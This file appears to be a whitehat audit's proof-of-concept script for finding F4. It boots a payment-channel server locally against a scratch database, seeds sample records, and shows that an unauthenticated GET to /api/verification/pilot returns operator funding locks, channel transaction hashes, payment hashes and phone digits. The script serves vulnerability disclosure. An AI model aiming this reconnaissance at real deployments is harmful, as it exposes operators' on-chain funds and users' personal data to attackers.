// F4 — Unauthenticated pilot verification endpoint leaks operator chain state.
//
// Target code (unmodified): GET /api/verification/pilot (server/index.js:1546) has
// NO auth middleware and returns the operator's funding lock script, every channel
// funding tx hash + outpoint, every successful fiber_payments hash, and users'
// phone last-4 digits. This is the recon an attacker needs to aim at the
// operator's on-chain liquidity.
//
// This PoC boots the unmodified target against a scratch DB, creates a user with a
// wallet binding, and then calls the endpoint with NO Authorization header and NO
// cookie — asserting the response is 200 and that it actually carries operator
// chain state (funding lock args, channel funding tx hashes, payment hashes).
//
// Run: node poc4-pilot-disclosure.mjs
import { spawn } from 'node:child_process'
import { startFnnStub, startChannelStub } from './fnnstub.mjs'
import { pg } from './deps.mjs'
import { ensureScratchDb } from './dbsetup.mjs'

const REPO = process.env.CKB_WHITEHAT_TARGET || '/tmp/ckb-whitehat/dular2/repo'
const PORT = 8793
const STUB_OP = 8427
const STUB_RX = 8437
const { Client } = pg

const dbUrl = await ensureScratchDb()
console.log(`[setup] scratch DB ready: ${dbUrl.replace(/:[^:@/]+@/, ':***@')}`)

const payments = []
const stub = await startFnnStub({ port: STUB_OP, payments })
const stubRx = await startFnnStub({ port: STUB_RX, payments })

const env = {
  ...process.env,
  DEMO_MODE: 'true',
  OTP_DEMO_MODE: 'true',
  LEGACY_MANAGED_WALLET_ENABLED: 'true',
  DATABASE_URL: dbUrl,
  SESSION_SECRET: 'whitehat',
  API_PORT: String(PORT),
  FIBER_RPC_URL: `http://127.0.0.1:${STUB_OP}`,
  FIBER_RECEIVER_RPC_URL: `http://127.0.0.1:${STUB_RX}`,
  CKB_TESTNET_RPC_URL: 'http://127.0.0.1:1',
}

const app = spawn('node', ['server/index.js'], { cwd: REPO, env, stdio: ['ignore', 'pipe', 'pipe'] })
let appLog = ''
app.stdout.on('data', d => { appLog += d })
app.stderr.on('data', d => { appLog += d })

const base = `http://127.0.0.1:${PORT}`
const waitReady = async () => {
  for (let i = 0; i < 60; i++) {
    try {
      const r = await fetch(`${base}/api/health`)
      if (r.status < 500) return
    } catch { /* not up yet */ }
    await new Promise(r => setTimeout(r, 250))
  }
  throw new Error('target did not start: ' + appLog.slice(-500))
}
await waitReady()
console.log(`[setup] target on :${PORT}`)

const db = new Client({ connectionString: dbUrl })
await db.connect()

// a user with a wallet binding + a channel-evidence row, so the endpoint has
// something to leak
const PUBKEY = '11'.repeat(33)
const LOCKARG = '22'.repeat(20)
const { rows: [user] } = await db.query(
  `INSERT INTO users (phone, fiber_pubkey, ckb_lock_arg, verified_at)
   VALUES ($1, $2, $3, now())
   ON CONFLICT (phone) DO UPDATE SET fiber_pubkey = $2, ckb_lock_arg = $3, verified_at = now()
   RETURNING id`,
  ['0700000004', PUBKEY, LOCKARG],
)
await db.query(
  `INSERT INTO channel_evidence (user_id, channel_id, funding_tx_hash, funding_tx_index, channel_outpoint, peer_pubkey, amount_base_units)
   VALUES ($1, $2, $3, $4, $5, $6, $7)
   ON CONFLICT (channel_id) DO NOTHING`,
  [user.id, '0x' + 'a0'.repeat(32), '0x' + 'b0'.repeat(32), '0', '0x' + 'b0'.repeat(32) + '00000000', PUBKEY, 1000000000],
)
await db.query(
  `INSERT INTO fiber_payments (user_id, payment_hash, direction, amount_base_units, status, source_type)
   VALUES ($1, $2, 'sent', $3, 'Success', 'deposit')
   ON CONFLICT (payment_hash) DO NOTHING`,
  [user.id, '0x' + 'c0'.repeat(32), 1000000000],
)

// THE ATTACK: no Authorization header, no cookie, no session.
const res = await fetch(`${base}/api/verification/pilot`)
const body = await res.json().catch(() => null)

const operator = body?.operator || body?.fundingLock || body?.funding || {}
const channels = body?.channels || body?.channelEvidence || []
const leaked = body?.payments || body?.fiberPayments || []
const users = body?.users || []

const leakedLock = JSON.stringify(body || {}).match(/0x[0-9a-f]{40,}/i) !== null
const leakedTx = JSON.stringify(body || {}).includes('b0'.repeat(32))
const leakedHash = JSON.stringify(body || {}).includes('c0'.repeat(32))
const leakedPhone = JSON.stringify(body || {}).includes('0004')

console.log(`[attack] GET /api/verification/pilot (no auth) -> HTTP ${res.status}`)
console.log(`[state] operator=${JSON.stringify(operator).slice(0, 120)}`)
console.log(`[state] channels=${Array.isArray(channels) ? channels.length : 'n/a'} payments=${Array.isArray(leaked) ? leaked.length : 'n/a'} users=${Array.isArray(users) ? users.length : 'n/a'}`)
console.log(`[state] leaks funding-lock-hex=${leakedLock} channel-funding-tx=${leakedTx} payment-hash=${leakedHash} phone-last4=${leakedPhone}`)

await db.end()

const fired = res.status === 200 && leakedLock && (leakedTx || leakedHash)
if (fired) {
  console.log('F4 FIRED — unauthenticated /api/verification/pilot returned operator chain state (funding lock, channel tx hashes, payment hashes).')
  console.log('FINDING F4 FIRED')
} else {
  console.log(`F4 check: status=${res.status} lock=${leakedLock} tx=${leakedTx} hash=${leakedHash}`)
  console.log('FINDING F4 UNPROVEN')
}

app.kill()
await new Promise(r => setTimeout(r, 300))
stub.close(); stubRx.close()
process.exit(fired ? 0 : 1)
